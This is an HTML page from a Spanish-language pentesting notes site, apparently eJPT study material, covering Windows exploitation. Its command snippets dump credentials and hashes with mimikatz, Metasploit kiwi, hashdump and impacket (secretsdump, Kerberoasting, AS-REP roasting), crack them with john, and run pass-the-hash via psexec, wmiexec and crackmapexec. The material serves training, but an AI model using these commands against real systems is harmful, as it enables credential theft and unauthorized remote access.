@@ -1,0 +1,1213 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Dumping passwords/hashes#Para obtener hashes con kiwi o mimikatz es posible que se requieran privilegios elevados
+Módulo kiwi metasploit#A través de metasploit se puede cargar el módulo kiwi (mimikatz integrado en metasploit). Teniendo una sesión de meterpreter.
+pgrep lsass migrate &lt;PID de lsass&gt; load kiwi ###### PARA VER TODAS LAS OPCIONES ESCRIBIMOS UN &#34;&#39;?&#34; ### OPCIONES INTERESANTES creds_all #si hay alguna en texto plano lo mostrará creds_kerberos password_change lsa_dump_secrets wifi_list Mimikatz#Otra manera es con mimikatz de manera nativa, se puede subir a través de un meterpreter, o con certutil.">
+<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
+<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#343a40">
+<meta name="color-scheme" content="light dark"><meta property="og:url" content="http://localhost:1313/docs/6---hacking-windows/explotacion/">
+  <meta property="og:site_name" content="GlmbXecurity">
+  <meta property="og:title" content="GlmbXecurity">
+  <meta property="og:description" content="Dumping passwords/hashes#Para obtener hashes con kiwi o mimikatz es posible que se requieran privilegios elevados
+Módulo kiwi metasploit#A través de metasploit se puede cargar el módulo kiwi (mimikatz integrado en metasploit). Teniendo una sesión de meterpreter.
+pgrep lsass migrate &lt;PID de lsass&gt; load kiwi ###### PARA VER TODAS LAS OPCIONES ESCRIBIMOS UN &#34;&#39;?&#34; ### OPCIONES INTERESANTES creds_all #si hay alguna en texto plano lo mostrará creds_kerberos password_change lsa_dump_secrets wifi_list Mimikatz#Otra manera es con mimikatz de manera nativa, se puede subir a través de un meterpreter, o con certutil.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="docs">
+<title>Explotacion | GlmbXecurity</title>
+<link rel="manifest" href="/manifest.json">
+<link rel="icon" href="/favicon.png" >
+<link rel="stylesheet" href="/book.min.67c38b1f4695c6eb30b8c2984203ce95b67bacb41b7c2e64b87224bbeff3b603.css" integrity="sha256-Z8OLH0aVxuswuMKYQgPOlbZ7rLQbfC5kuHIku&#43;/ztgM=" crossorigin="anonymous">
+  <script defer src="/flexsearch.min.js"></script>
+  <script defer src="/en.search.min.053c47a53420d4d8f91a0d7ff16baf41deb7e3c08baea451fd3e10effc18b34b.js" integrity="sha256-BTxHpTQg1Nj5Gg1/8WuvQd6348CLrqRR/T4Q7/wYs0s=" crossorigin="anonymous"></script>
+
+  
+
+<!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+  
+</head>
+<body dir="ltr">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    <aside class="book-menu">
+      <div class="book-menu-content">
+        
+  <nav>
+<h2 class="book-brand">
+  <a class="flex align-center" href="/"><span>GlmbXecurity</span>
+  </a>
+</h2>
+
+
+<div class="book-search">
+  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-4725ecd4288801edac599d317b7f3fbd" class="toggle"  />
+    <label for="section-4725ecd4288801edac599d317b7f3fbd" class="flex justify-between">
+      <a href="/docs/1---reconocimiento/" class="">Reconocimiento</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/1---reconocimiento/busqueda-de-exploits/" class="">Busqueda De Exploits</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/1---reconocimiento/descubrir-equipos-en-la-red/" class="">Descubrir Equipos en La Red</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/1---reconocimiento/dominios-y-emails/" class="">Dominios Y Emails</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/1---reconocimiento/google-dorks-cheatsheet/" class="">Google Dorks Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/1---reconocimiento/nmap/" class="">Nmap</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/1---reconocimiento/reconocimiento-web/" class="">Reconocimiento Web</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/1---reconocimiento/version-de-servicio-y-s.o/" class="">Version De Servicio Y S. O</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/1---reconocimiento/waf/" class="">Waf</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-113277fae8d94cf467d477245d42c6e9" class="toggle"  />
+    <label for="section-113277fae8d94cf467d477245d42c6e9" class="flex justify-between">
+      <a href="/docs/3---hacking-web/" class="">Hacking web</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/3---hacking-web/anotaciones-varias/" class="">Anotaciones Varias</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/3---hacking-web/bypass-subir-ficheros-con-extensiones-no-permitidas/" class="">Bypass Subir Ficheros Con Extensiones No Permitidas</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/3---hacking-web/descubrimiento-cms/" class="">Descubrimiento Cms</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/3---hacking-web/drupal/" class="">Drupal</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/3---hacking-web/enumeraci%C3%B3n-web-avanzada/" class="">Enumeración Web Avanzada</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/3---hacking-web/fuerza-bruta-login-web/" class="">Fuerza Bruta Login Web</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/3---hacking-web/fuzzing-web/" class="">Fuzzing Web</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/3---hacking-web/lfi/" class="">Lfi</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/3---hacking-web/vulnerabilidad-target-blank/" class="">Vulnerabilidad Target Blank</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/3---hacking-web/webdav/" class="">Web Dav</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/3---hacking-web/wordpress/" class="">Wordpress</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/3---hacking-web/xss/" class="">Xss</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-6d708dbd650445c961ea376c6ec392a3" class="toggle"  />
+    <label for="section-6d708dbd650445c961ea376c6ec392a3" class="flex justify-between">
+      <a href="/docs/2---hacking-gen%C3%A9rico/" class="">Hacking Genérico</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/2---hacking-gen%C3%A9rico/codificaci%C3%B3n/" class="">Codificación</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/2---hacking-gen%C3%A9rico/cracking-fuerza-bruta/" class="">Cracking Fuerza Bruta</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/2---hacking-gen%C3%A9rico/esteganograf%C3%ADa/" class="">Esteganografía</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/2---hacking-gen%C3%A9rico/local-port-forwarding/" class="">Local Port Forwarding</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/2---hacking-gen%C3%A9rico/metasploit-y-msfvenom/" class="">Metasploit Y Msf Venom</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/2---hacking-gen%C3%A9rico/obfuscation---av-evasion/" class="">Obfuscation Av Evasion</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/2---hacking-gen%C3%A9rico/repositorio-git/" class="">Repositorio Git</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/2---hacking-gen%C3%A9rico/reverse-shells/" class="">Reverse Shells</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/2---hacking-gen%C3%A9rico/wireshark/" class="">Wireshark</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-653fb6148147fb5a54d5ae8f6cdc32db" class="toggle"  />
+    <label for="section-653fb6148147fb5a54d5ae8f6cdc32db" class="flex justify-between">
+      <a href="/docs/4---hacking-servicios/" class="">Hacking Servicios</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/4---hacking-servicios/111-rcpbind-nfs/" class="">111 RCP Bind ( Nfs)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/4---hacking-servicios/139-445-smb/" class="">139, 445 Smb</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/4---hacking-servicios/161-snmp/" class="">161 SNMP</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/4---hacking-servicios/21-ftp/" class="">21 FTP</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/4---hacking-servicios/22-ssh/" class="">22 SSH</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/4---hacking-servicios/25-smtp/" class="">25 SMTP</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/4---hacking-servicios/3306-sql/" class="">3306 SQL</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/4---hacking-servicios/3389-rdp/" class="">3389 Rdp</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/4---hacking-servicios/5985-winrm/" class="">5985 Win Rm</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/4---hacking-servicios/8080-apache-tomcat/" class="">8080 Apache Tomcat</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-4702fb46d9830af28f7b5deb2ce3e3da" class="toggle"  />
+    <label for="section-4702fb46d9830af28f7b5deb2ce3e3da" class="flex justify-between">
+      <a href="/docs/5---hacking-linux/" class="">Hacking Linux</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/5---hacking-linux/comandos-b%C3%A1sicos/" class="">Comandos Básicos</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/5---hacking-linux/crack-etc-shadow/" class="">Crack Etc Shadow</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/5---hacking-linux/escalada-privilegios/" class="">Escalada Privilegios</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/5---hacking-linux/escribir-en-terminal-de-una-v%C3%ADctima/" class="">Escribir en Terminal De Una Víctima</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/5---hacking-linux/path-hijacking/" class="">Path Hijacking</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/5---hacking-linux/pivoting-de-usuarios/" class="">Pivoting De Usuarios</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/5---hacking-linux/tratamiento-de-la-tty/" class="">Tratamiento De La Tty</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-bad90e32cc0f7a46aaa4431b64839fc0" class="toggle" checked />
+    <label for="section-bad90e32cc0f7a46aaa4431b64839fc0" class="flex justify-between">
+      <a href="/docs/6---hacking-windows/" class="">Hacking Windows</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/6---hacking-windows/comandos-b%C3%A1sicos/" class="">Comandos Básicos</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/6---hacking-windows/enumeracion/" class="">Enumeracion</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/6---hacking-windows/escalada-privilegios/" class="">Escalada Privilegios</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/6---hacking-windows/explotacion/" class="active">Explotacion</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/6---hacking-windows/vulnerabilidades-mas-conocidas/" class="">Vulnerabilidades Mas Conocidas</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-c0791bead2c829c6f4d4cc85517e0210" class="toggle"  />
+    <label for="section-c0791bead2c829c6f4d4cc85517e0210" class="flex justify-between">
+      <a href="/docs/7---proyectos/" class="">Proyectos</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/7---proyectos/certification-authority-&#43;-acme/" class="">Certification Authority Acme</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/7---proyectos/personalizar-kali-con-bspwm/" class="">Personalizar Kali Con Bspwm</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/7---proyectos/servidor-git-&#43;-web-apuntes-con-obsidian/" class="">Servidor Git Web Apuntes Con Obsidian</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/7---proyectos/servidor-vpn-privado-&#43;-pihole/" class="">Servidor VPN Privado Pi Hole</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/7---proyectos/vaultwarden-password-manager/" class="">Vaultwarden Password Manager</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/links-de-inter%C3%A9s/" class="">Links De Interés</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/preparacion-ejpt-v2/" class="">Preparacion Ejpt V2</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+ 
+      </div>
+    </aside>
+
+    <div class="book-page">
+      <header class="book-header">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <strong>Explotacion</strong>
+
+  <label for="toc-control">
+    
+    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden clearfix">
+    
+  
+<nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#dumping-passwordshashes">Dumping passwords/hashes</a></li>
+        <li><a href="#pass-the-hash">Pass-the-hash</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+
+  </aside>
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown book-article"><h3 id="dumping-passwordshashes">
+  Dumping passwords/hashes
+  <a class="anchor" href="#dumping-passwordshashes">#</a>
+</h3>
+<p><strong>Para obtener hashes con kiwi o mimikatz es posible que se requieran privilegios elevados</strong></p>
+<h4 id="módulo-kiwi-metasploit">
+  Módulo kiwi metasploit
+  <a class="anchor" href="#m%c3%b3dulo-kiwi-metasploit">#</a>
+</h4>
+<p>A través de metasploit se puede cargar el módulo kiwi (mimikatz integrado en metasploit). Teniendo una sesión de meterpreter.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pgrep lsass
+</span></span><span style="display:flex;"><span>migrate &lt;PID de lsass&gt;
+</span></span><span style="display:flex;"><span>load kiwi
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">###### PARA VER TODAS LAS OPCIONES ESCRIBIMOS UN &#34;&#39;?&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">### OPCIONES INTERESANTES</span>
+</span></span><span style="display:flex;"><span>creds_all <span style="color:#75715e">#si hay alguna en texto plano lo mostrará</span>
+</span></span><span style="display:flex;"><span>creds_kerberos
+</span></span><span style="display:flex;"><span>password_change
+</span></span><span style="display:flex;"><span>lsa_dump_secrets
+</span></span><span style="display:flex;"><span>wifi_list
+</span></span></code></pre></div><h4 id="mimikatz">
+  Mimikatz
+  <a class="anchor" href="#mimikatz">#</a>
+</h4>
+<p>Otra manera es con mimikatz de manera nativa, se puede subir a través de un meterpreter, o con certutil. Mimikatz por defecto en kali se encuentra en: <strong>/usr/share/windows-resources/mimikatz/x64/mimikatz.exe</strong></p>
+<p>Una vez ejecutado:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>privilege::debug 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## Si nos devielve Privilege &#39;20&#39; OK está todo correcto</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">####COMANDOS INTERESANTES</span>
+</span></span><span style="display:flex;"><span>lsadump::sam
+</span></span><span style="display:flex;"><span>lsadump::secrets
+</span></span><span style="display:flex;"><span>sekurlsa:logonpasswords <span style="color:#75715e">#si hay alguna en texto plano lo mostrará</span>
+</span></span></code></pre></div><h4 id="con-meterpreter">
+  Con meterpreter
+  <a class="anchor" href="#con-meterpreter">#</a>
+</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hashdump
+</span></span></code></pre></div><h4 id="ataque-tgt-con-impacket">
+  Ataque TGT con impacket
+  <a class="anchor" href="#ataque-tgt-con-impacket">#</a>
+</h4>
+<p>si tenemos una pareja de credenciales (user/pass), podemos intentar obtener todos los hashes de los usuarios del dominio, incluido el del administrador.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#opcion1</span>
+</span></span><span style="display:flex;"><span>impacket-secretsdump -just-dc usuario@ip <span style="color:#f92672">(</span>SAM HASH, para pass-the-hash<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#opcion2</span>
+</span></span><span style="display:flex;"><span>impacket-GetUserSPNs dominio/usuario:contraseña -request <span style="color:#f92672">(</span>para john<span style="color:#f92672">)</span>
+</span></span></code></pre></div><h4 id="not-preauth-attack-impacket">
+  NOT-PREAUTH Attack Impacket
+  <a class="anchor" href="#not-preauth-attack-impacket">#</a>
+</h4>
+<p>Cuando detectamos usuarios en un dominio que tienen el NOT-PREAUTH, podemos intentar obtener el hash de su contraseña para luego crackearla con john the ripper.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#opcion1</span>
+</span></span><span style="display:flex;"><span>impacket-GetNPUsers &lt;dominio&gt;/&lt;usuario&gt; -no-pass
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#opcion2</span>
+</span></span><span style="display:flex;"><span>impacket-GetNPUsers &lt;dominio&gt;/ -no-pass -usersfile usuarios.txt
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#Con el hash obtenido, lo pasamos por john</span>
+</span></span><span style="display:flex;"><span>john hash.txt --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt
+</span></span></code></pre></div><h3 id="pass-the-hash">
+  Pass-the-hash
+  <a class="anchor" href="#pass-the-hash">#</a>
+</h3>
+<p>Poemos intentar acceder al dominio sin necesidad de crackear la contraseña, solamente teniendo el hash, haciendo un <strong>pass the hash</strong></p>
+<h4 id="impacket">
+  impacket
+  <a class="anchor" href="#impacket">#</a>
+</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#opcion 1</span>
+</span></span><span style="display:flex;"><span>impacket-psexec usuario@ip -hashes &lt;hash en cadena de texto&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#opcion 2</span>
+</span></span><span style="display:flex;"><span>impacket-wmiexec &lt;dominio&gt;/user@ip -hashes &lt;hash en cadena de texto&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">### EJEMPLO</span>
+</span></span><span style="display:flex;"><span>impacket-psexec Administrator@10.10.10.4 -hashes aaeeff31234aaaadddsfee345:2345:addfbbe
+</span></span></code></pre></div><h4 id="metasploit-psexec">
+  Metasploit psexec
+  <a class="anchor" href="#metasploit-psexec">#</a>
+</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>use exploit/windows/smb/psexec
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># RELLENAR OPCIONES, PERO LAS IMPORTANTES SON</span>
+</span></span><span style="display:flex;"><span>SMBuser
+</span></span><span style="display:flex;"><span>SMBPass <span style="color:#75715e">##AQUI INTRODUCIMOS EL NTML HASH O NT HASH</span>
+</span></span><span style="display:flex;"><span>set target Command <span style="color:#f92672">(</span>y si no funciona probar otro target<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>exploit
+</span></span></code></pre></div><h4 id="crackmapexec">
+  Crackmapexec
+  <a class="anchor" href="#crackmapexec">#</a>
+</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">##`PROBAR QUE FUNCIONA</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#RESPETAR COMILLAS</span>
+</span></span><span style="display:flex;"><span>crackmapexec smb &lt;target IP&gt; -u &lt;user&gt; -H <span style="color:#e6db74">&#34;hash&#34;</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## EJECUTAR COMANDOS</span>
+</span></span><span style="display:flex;"><span>crackmapexec smb &lt;target IP&gt; -u &lt;user&gt; -H <span style="color:#e6db74">&#34;hash&#34;</span>  -x <span style="color:#e6db74">&#34;ipconfig&#34;</span>
+</span></span></code></pre></div></article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+
+
+
+
+</div>
+
+
+
+  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+
+
+ 
+        
+      </footer>
+
+      
+  
+  <div class="book-comments">
+
+</div>
+  
+ 
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+    <aside class="book-toc">
+      <div class="book-toc-content">
+        
+  
+<nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#dumping-passwordshashes">Dumping passwords/hashes</a></li>
+        <li><a href="#pass-the-hash">Pass-the-hash</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+ 
+      </div>
+    </aside>
+    
+  </main>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
